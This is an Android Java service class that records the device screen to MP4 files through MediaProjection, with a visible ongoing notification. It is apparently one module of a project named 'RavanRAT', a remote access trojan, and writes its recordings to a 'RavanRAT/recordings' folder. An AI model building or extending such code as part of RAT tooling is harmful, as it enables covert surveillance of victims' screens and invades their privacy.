package com.security.ravan;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.media.MediaRecorder;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.Surface;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class ScreenRecordService extends Service {
    private static final String TAG = "ScreenRecordService";
    private static final String CHANNEL_ID = "ScreenRecordChannel";
    private static final int NOTIFICATION_ID = 3;
    private static final String EXTRA_SCREEN_CAPTURE_RESULT_CODE = "extra_screen_capture_result_code";
    private static final String EXTRA_SCREEN_CAPTURE_INTENT = "extra_screen_capture_intent";

    private MediaProjection mediaProjection;
    private MediaRecorder mediaRecorder;
    private android.hardware.display.VirtualDisplay virtualDisplay;

    private String outputPath;
    private static volatile boolean isRecording = false;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent == null) return START_NOT_STICKY;
        createNotificationChannel();
        try {
            startForeground(NOTIFICATION_ID, createNotification("Preparing recording..."));
        } catch (Exception e) {
            Log.w(TAG, "startForeground failed", e);
        }
        String action = intent.getAction();
        if ("START_RECORD".equals(action)) {
            int resultCode = intent.getIntExtra(EXTRA_SCREEN_CAPTURE_RESULT_CODE, -1);
            Intent data = intent.getParcelableExtra(EXTRA_SCREEN_CAPTURE_INTENT);
            Log.d(TAG, "START_RECORD received resultCode=" + resultCode + " data=" + (data != null ? "present" : "null"));
            if (resultCode != android.app.Activity.RESULT_OK) {
                Log.e(TAG, "Cannot start recording: invalid resultCode=" + resultCode);
                stopSelf();
                return START_NOT_STICKY;
            }
            if (data == null) {
                Log.e(TAG, "Cannot start recording: projection data Intent is null");
                stopSelf();
                return START_NOT_STICKY;
            }
            startForegroundRecording(resultCode, data);
            return START_STICKY;
        } else if ("STOP_RECORD".equals(action)) {
            stopRecordingAndStopSelf();
            return START_NOT_STICKY;
        }
        return START_NOT_STICKY;
    }

    private void startForegroundRecording(int resultCode, Intent data) {
        if (resultCode != android.app.Activity.RESULT_OK) {
            Log.e(TAG, "startForegroundRecording aborted: resultCode=" + resultCode);
            stopSelf();
            return;
        }
        if (data == null) {
            Log.e(TAG, "startForegroundRecording aborted: projection data is null");
            stopSelf();
            return;
        }
        try {
            // Configure output file
            File recordingsDir = new File(Environment.getExternalStorageDirectory(), "RavanRAT/recordings");
            if (!recordingsDir.exists()) recordingsDir.mkdirs();
            String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(new Date());
            outputPath = new File(recordingsDir, "screen_record_" + timestamp + ".mp4").getAbsolutePath();

            // Prepare MediaRecorder
            mediaRecorder = new MediaRecorder();
            // Do not enable audio recording to avoid extra permission requirements
            mediaRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            mediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
            mediaRecorder.setVideoEncodingBitRate(5 * 1000 * 1000);
            mediaRecorder.setVideoFrameRate(30);

            // Get display metrics
            DisplayMetrics metrics = getResources().getDisplayMetrics();
            int width = Math.min(metrics.widthPixels, 1280);
            int height = Math.min(metrics.heightPixels, 720);
            mediaRecorder.setVideoSize(width, height);

            mediaRecorder.setOutputFile(outputPath);
            mediaRecorder.prepare();

            // Now safe to acquire MediaProjection
            MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
            if (mpm == null) {
                Log.e(TAG, "MediaProjectionManager not available");
                stopSelf();
                return;
            }
            mediaProjection = mpm.getMediaProjection(resultCode, data);
            if (mediaProjection == null) {
                Log.e(TAG, "MediaProjection is null after getMediaProjection. resultCode=" + resultCode + " data=" + (data != null ? "present" : "null"));
                stopSelf();
                return;
            }

            Surface surface = mediaRecorder.getSurface();

            virtualDisplay = mediaProjection.createVirtualDisplay("ScreenRecord",
                    width, height, metrics.densityDpi,
                    android.hardware.display.DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    surface, null, null);

            mediaRecorder.start();
            Log.i(TAG, "Recording started: " + outputPath);
            isRecording = true;
            // update notification
            try {
                Notification n = createNotification("Recording: " + new File(outputPath).getName());
                NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
                if (nm != null) nm.notify(NOTIFICATION_ID, n);
            } catch (Exception e) {
                Log.w(TAG, "Failed to update notification", e);
            }

        } catch (IOException e) {
            Log.e(TAG, "IO error preparing MediaRecorder", e);
            stopSelf();
        } catch (SecurityException e) {
            Log.e(TAG, "Security exception while starting recording", e);
            stopSelf();
        } catch (Exception e) {
            Log.e(TAG, "Unexpected error starting recording", e);
            stopSelf();
        }
    }

    private void stopRecordingAndStopSelf() {
        try {
            if (mediaRecorder != null) {
                try {
                    mediaRecorder.stop();
                } catch (Exception e) {
                    Log.w(TAG, "Error stopping mediaRecorder", e);
                }
                try {
                    mediaRecorder.reset();
                    mediaRecorder.release();
                } catch (Exception e) {
                    Log.w(TAG, "Error releasing mediaRecorder", e);
                }
                mediaRecorder = null;
            }

            if (virtualDisplay != null) {
                try {
                    virtualDisplay.release();
                } catch (Exception e) {
                    Log.w(TAG, "Error releasing virtualDisplay", e);
                }
                virtualDisplay = null;
            }

            if (mediaProjection != null) {
                try {
                    mediaProjection.stop();
                } catch (Exception e) {
                    Log.w(TAG, "Error stopping mediaProjection", e);
                }
                mediaProjection = null;
            }

            Log.i(TAG, "Recording stopped. File: " + outputPath);
            isRecording = false;
        } finally {
            try {
                stopForeground(true);
            } catch (Exception e) {
                Log.w(TAG, "Error stopping foreground", e);
            }
            stopSelf();
        }
    }

    public static boolean isRecording() {
        return isRecording;
    }

    private Notification createNotification(String text) {
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent,
                PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT);

        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("📹 Screen Recording")
                .setContentText(text)
                .setSmallIcon(android.R.drawable.ic_btn_speak_now)
                .setContentIntent(pendingIntent)
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_HIGH)
                .build();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "Screen Recording",
                    NotificationManager.IMPORTANCE_DEFAULT);
            channel.setDescription("Recording screen");
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);
        }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

}
